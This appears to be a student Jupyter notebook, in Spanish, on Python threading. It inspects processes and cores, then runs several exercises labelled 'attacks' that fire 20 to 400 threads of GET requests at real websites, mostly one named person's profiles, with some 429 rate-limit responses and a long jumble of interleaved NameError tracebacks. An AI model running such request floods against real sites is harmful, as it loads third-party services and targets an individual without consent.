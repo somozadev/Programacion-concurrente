{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h1 style = \"text-align:left; color:#433789\">1. Crear plantilla y portada para todos los ejercicios que realizaremos a lo largo del curso.</h1>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "scrolled": false
   },
   "source": [
    "<h1 style = \"text-align:center\">Programación Concurrente y Distribuida </h1>\n",
    "<a href=\"https://github.com/somozadev\">\n",
    "<img src=\"MARCOS_SOMOZA.jfif\" title = \"Marcos Eladio Somoza Corral 21711787\" alt=\"Marcos Eladio Somoza Corral\" width=\"100\" height=\"100\" style=\"float:left;vertical-alig:middle\">\n",
    "<img src=\"UEM.png\" title= \"M21\"alt=\"UE\" width=\"105\" heighºt=\"105\" style=\"float:right;vertical-alig:middle\">"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h1 style = \"text-align:left; color:#433789\">2.Cree un programa para determinar</h1>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "import threading"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def cpu():\n",
    "    while True:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h3 style = \"text-align:left; color:SlateBlue;\"> a)El número de proceso que lo maneja y cuántos procesos están activos</h3>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "El proceso que está manejando este programa es:  20232\nHilos lanzados 13\n"
     ]
    }
   ],
   "source": [
    "print(\"El proceso que está manejando este programa es: \", os.getpid())\n",
    "print(\"Hilos lanzados\", threading.activeCount())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h3 style = \"text-align:left; color:SlateBlue;\"> b)¿Cuántos hilos activos tienen lanzados en este momento?</h3>"
   ]
  },
  {
   "source": [
    "<img src=\"resource.jfif\" title = \"Marcos Eladio Somoza Corral 21711787\" alt=\"Marcos Eladio Somoza Corral\" style=\"float:left;vertical-alig:middle\">\n",
    "<p style=\"text-align:left;color:#877B9A\"> Vemos que hay 19 , no tiene que ver con los 13 mostrados por código... Esto se debe a que en el task manager nos muestran los hilos de el programa como lo los de jupyter o vscode.</p>\n"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h3 style = \"text-align:left; color:SlateBlue;\"> c)¿Cuántos cores lógicos tiene su equipo?</h3>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Este equipo tiene un total de 20 núcleos lógicos\n"
     ]
    }
   ],
   "source": [
    "print(\"Este equipo tiene un total de\",os.cpu_count(), \"núcleos lógicos\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h3 style = \"text-align:left; color:SlateBlue;\"> d)¿Cuántos cores físicos tiene su equipo?</h3>"
   ]
  },
  {
   "source": [
    "print(\"Este equipo tiene un total de\",int(os.cpu_count()/2), \"núcleos físicos\")"
   ],
   "cell_type": "code",
   "metadata": {},
   "execution_count": 1,
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "Este equipo tiene un total de 6 núcleos físicos\n"
     ]
    }
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<p style=\"text-align:left;color:#877B9A\">Si vemos las propiedades del equipo vemos que \n",
    "tenemos un Intel(R) Core(TM) i9-10850k @ 3.60GHz de 10 núcleos físicos. Para ver los cores físicos se debe dividir entre 2 el resultado de os.cpu_count() dado que muestra también los hyperthreaded cores, donde cada núcleo se \"divide\" para crear un núcleo virtual extra. Información disponible en:  https://github.com/giampaolo/psutil/issues/427 </p>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h3 style = \"text-align:left; color:SlateBlue;\"> e)Enumere e idenfique los hilos lanzados</h3>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<_MainThread(MainThread, started 35220)>\n",
      "<Thread(Thread-4, started daemon 27760)>\n",
      "<Heartbeat(Thread-5, started daemon 27624)>\n",
      "<HistorySavingThread(IPythonHistorySavingThread, started 16364)>\n",
      "<ParentPollerWindows(Thread-3, started daemon 9480)>\n"
     ]
    }
   ],
   "source": [
    "for thread in threading.enumerate():\n",
    "    print(thread)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<p style=\"text-align:left;color:#675B7B\"> <b style = color:>1.MainThread:</b> se trata del hilo principal de la ejecución. </p>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<p style=\"text-align:left;color:#675B7B\"> <b style = color:>2.Daemon:</b> Hilo demonio,a veces los programas generan un hilo como un demonio que se ejecuta sin bloquear el programa principal de salir. El uso de hilos de demonio es útil para servicios donde puede que no haya una manera fácil de interrumpir el hilo, o donde dejar que el el hilo muera en medio de su trabajo, no pierde ni corrompe los datos (por ejemplo, un hilo que genera «latidos del corazón» para una herramienta de monitoreo de servicio).</p>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<p style=\"text-align:left;color:#675B7B\"> <b style = color:>3.Heartbeat:</b> Hilo encargado del loop central o heart loop. También marcado como hilo demonio.</p>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<p style=\"text-align:left;color:#675B7B\"> <b style = color:>4.HistorySavingThread:</b> de IPhython, se encarga del registro histórico de los hilos.</p>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<p style=\"text-align:left;color:#675B7B\"> <b style = color:>5.ParentPollerWindows:</b> Indica que los hilos trabajan en un sistema operativo determinado, windows en este caso. Ejemplo disponible en: https://codesuche.com/python-examples/parentpoller.ParentPollerUnix/ </p>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h1 style = \"text-align:left; color:#433789\">3. Lance un ataque usando 20 hilos a https://github.com/sukuzhanay</h1>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ataque():\n",
    "    ataque = requests.get('https://github.com/sukuzhanay')\n",
    "    ataque"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "ataque con 20 hilos\n",
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "print('ataque con 20 hilos')\n",
    "for i in range(20):\n",
    "    threading.Thread(target=ataque).start()\n",
    "print(requests.get('https://github.com/sukuzhanay'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h1 style = \"text-align:left; color:#433789\">4. Lance un ataque de 30 hilos a https://www.youtube.com/channel/UCEXbXdeafAjBahYK2hoQJFg</h1>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ataque():\n",
    "    ataque = requests.get('https://www.youtube.com/channel/UCEXbXdeafAjBahYK2hoQJFg')\n",
    "    ataque"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "ataque con 30 hilos\n",
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "print('ataque con 30 hilos')\n",
    "for i in range(30):\n",
    "    threading.Thread(target=ataque).start()\n",
    "print(requests.get('https://www.youtube.com/channel/UCEXbXdeafAjBahYK2hoQJFg'))"
   ]
  },
  {
   "source": [
    "<h1 style = \"text-align:left; color:#433789\">5. Lance un ataque de 50 hilos a https://rpubs.com/chirstian_sucuzhanay</h1>\n"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ataque():\n",
    "    ataque = requests.get('https://rpubs.com/chirstian_sucuzhanay')\n",
    "    ataque"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "ataque con 50 hilos\n",
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "print('ataque con 50 hilos')\n",
    "for i in range(50):\n",
    "    threading.Thread(target=ataque).start()\n",
    "print(requests.get('https://rpubs.com/chirstian_sucuzhanay'))"
   ]
  },
  {
   "source": [
    "<h1 style = \"text-align:left; color:#433789\">6. Lance un ataque de 100 hilos a https://rpubs.com/chirstian_sucuzhanay</h1>"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ataque():\n",
    "    ataque = requests.get('https://rpubs.com/chirstian_sucuzhanay')\n",
    "    ataque"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "ataque con 100 hilos\n",
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "print('ataque con 100 hilos')\n",
    "for i in range(100):\n",
    "    threading.Thread(target=ataque).start()\n",
    "print(requests.get('https://rpubs.com/chirstian_sucuzhanay'))"
   ]
  },
  {
   "source": [
    "<h1 style = \"text-align:left; color:#433789\">7. Lance un ataque de 200 hilos a https://kaggle.com/sukuzhanay</h1>"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ataque():\n",
    "    ataque = requests.get('https://kaggle.com/sukuzhanay')\n",
    "    ataque"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "ataque con 200 hilos\n",
      "<Response [429]>\n"
     ]
    }
   ],
   "source": [
    "print('ataque con 200 hilos')\n",
    "for i in range(200):\n",
    "    threading.Thread(target=ataque).start()\n",
    "    \n",
    "print(requests.get('https://kaggle.com/sukuzhanay'))"
   ]
  },
  {
   "source": [
    "<h1 style = \"text-align:left; color:#433789\">8. Lance un ataque de 300 hilos a https://stackoverflow.com/story/christian-sucuzhanay-arevalo</h1>"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ataque():\n",
    "    ataque = requests.get('https://stackoverflow.com/story/christian-sucuzhanay-arevalo')\n",
    "    ataque"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "ataque con 300 hilos\n",
      "<Response [429]>\n"
     ]
    }
   ],
   "source": [
    "print('ataque con 300 hilos')\n",
    "for i in range(300):\n",
    "    threading.Thread(target=ataque).start()\n",
    "print(requests.get('https://stackoverflow.com/story/christian-sucuzhanay-arevalo'))"
   ]
  },
  {
   "source": [
    "<h1 style = \"text-align:left; color:#433789\">9. Lance un ataque de 400 hilos a https://elburnout.com/</h1>"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ataque():\n",
    "    ataque = requests.get('https://elburnout.com/')\n",
    "    ataque"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "tags": [
     "outputPrepend"
    ]
   },
   "outputs": [
    {
     "output_type": "stream",
     "name": "stderr",
     "text": [
      "un\n",
      "NameError    Exception in thread Thread-1153:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      ": self.run():     name 'requests' is not defined\n",
      "name 'requests' is not defined\n",
      "Exception in thread \n",
      "self._target(*self._args, **self._kwargs)Thread-1154:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "\n",
      "      File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "Exception in thread Thread-1155:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self.run()NameErrorException in thread \n",
      ": Thread-1156:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "NameErrorname 'requests' is not defined\n",
      "      File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "Exception in thread Thread-1157:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "NameErrorself.run(): : \n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "        Exception in thread name 'requests' is not defined    name 'requests' is not definedself.run()Thread-1158:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "    self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "\n",
      "self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "    \n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "NameErrorException in thread self._target(*self._args, **self._kwargs)NameError: Thread-1159:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "name 'requests' is not defined        Exception in thread : NameError\n",
      "self._target(*self._args, **self._kwargs)    Thread-1160:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      ": name 'requests' is not defined\n",
      "self.run()self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "name 'requests' is not defined\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "        \n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "\n",
      "Exception in thread self.run()NameError    Thread-1161:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "    self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "    Exception in thread self._target(*self._args, **self._kwargs): \n",
      "    self.run()Thread-1162:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "    \n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "NameError    self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "name 'requests' is not defined\n",
      "    Exception in thread self._target(*self._args, **self._kwargs): Thread-1163:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "Exception in thread     \n",
      "\n",
      "self.run()NameError    Thread-1164:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "Exception in thread name 'requests' is not defined\n",
      "self._target(*self._args, **self._kwargs)  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "Thread-1165:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "    self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      ": \n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "\n",
      "NameError: name 'requests' is not defined\n",
      "Exception in thread   File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "    name 'requests' is not defined    NameErrorThread-1166:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "    NameErrorself._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "\n",
      ": name 'requests' is not defined\n",
      "self._target(*self._args, **self._kwargs)Exception in thread self._target(*self._args, **self._kwargs): \n",
      "Thread-1167:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "name 'requests' is not defined\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "    Exception in thread     self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "\n",
      "self.run()    Thread-1168:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Exception in thread \n",
      "Thread-1169:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "        Exception in thread Thread-1170:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "self.run()    self.run()NameError: name 'requests' is not defined\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Exception in thread \n",
      "\n",
      "Thread-1171:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "NameError  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "    self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "NameError        Exception in thread Thread-1172self.run()self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "    :\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      ": self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "    name 'requests' is not defined\n",
      "NameError: name 'requests' is not defined\n",
      "    self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "NameError\n",
      ": name 'requests' is not defined\n",
      "Exception in thread   File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "Thread-1173self._target(*self._args, **self._kwargs):             :\n",
      "Exception in thread Thread-1174:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "\n",
      "NameErrorself.run()self._target(*self._args, **self._kwargs)Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "      File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self._target(*self._args, **self._kwargs): name 'requests' is not defined\n",
      "self.run()name 'requests' is not defined\n",
      "    \n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Exception in thread Thread-1175\n",
      "NameError\n",
      "self._target(*self._args, **self._kwargs)\n",
      "    :\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      ": name 'requests' is not defined\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "NameError    NameError\n",
      "self.run()Exception in thread :   File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      ": \n",
      "Thread-1176name 'requests' is not defined\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      ":\n",
      "Traceback (most recent call last):\n",
      "name 'requests' is not defined\n",
      "Exception in thread   File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "Thread-1177:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "        NameErrorException in thread     self._target(*self._args, **self._kwargs)\n",
      "self._target(*self._args, **self._kwargs): Thread-1178:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "    \n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "name 'requests' is not defined\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "NameError            : name 'requests' is not defined\n",
      "self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "NameErrorself._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "NameError        : name 'requests' is not defined\n",
      "self._target(*self._args, **self._kwargs)self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Exception in thread \n",
      ": self.run()Thread-1179:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "Exception in thread name 'requests' is not definedNameErrorThread-1180:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "Exception in thread Thread-1181:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      ": \n",
      "        NameErrorname 'requests' is not defined\n",
      "Exception in thread NameError: name 'requests' is not defined\n",
      "self.run()self.run()    Thread-1182:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      ": \n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Exception in thread \n",
      "        Thread-1183:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "Exception in thread       File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "    name 'requests' is not definedThread-1184:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "Exception in thread self._target(*self._args, **self._kwargs)self.run()\n",
      "NameErrorNameErrorThread-1185:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "    : name 'requests' is not defined\n",
      "Exception in thread \n",
      "self.run():   File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "name 'requests' is not defined\n",
      "        Thread-1186Exception in thread self._target(*self._args, **self._kwargs)    self.run()\n",
      ":\n",
      "Thread-1187:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Exception in thread \n",
      "Traceback (most recent call last):\n",
      "self.run()Thread-1188:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "Exception in thread       File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "\n",
      "      File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Thread-1189:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "NameError    NameErrorself._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self.run()NameErrorException in thread Thread-1190:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      ":   File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      ":     self._target(*self._args, **self._kwargs)name 'requests' is not defined\n",
      "\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "name 'requests' is not defined\n",
      "    self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "        : self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "name 'requests' is not defined\n",
      "NameErrorself.run()\n",
      "NameErrorException in thread \n",
      ": self._target(*self._args, **self._kwargs)  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      ": Thread-1191:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "name 'requests' is not defined\n",
      "    self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "name 'requests' is not defined\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Exception in thread NameError            Thread-1192:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "    self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      ": self.run()NameErrorname 'requests' is not definedself._target(*self._args, **self._kwargs)\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      ": name 'requests' is not defined\n",
      "Exception in thread self.run()\n",
      "    \n",
      "Thread-1193:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "            \n",
      "Exception in thread   File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self._target(*self._args, **self._kwargs)  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "Thread-1194:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Exception in thread NameError        self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "    Thread-1195:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "self._target(*self._args, **self._kwargs)\n",
      "Exception in thread \n",
      "self._target(*self._args, **self._kwargs):   File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Thread-1196:\n",
      "Traceback (most recent call last):\n",
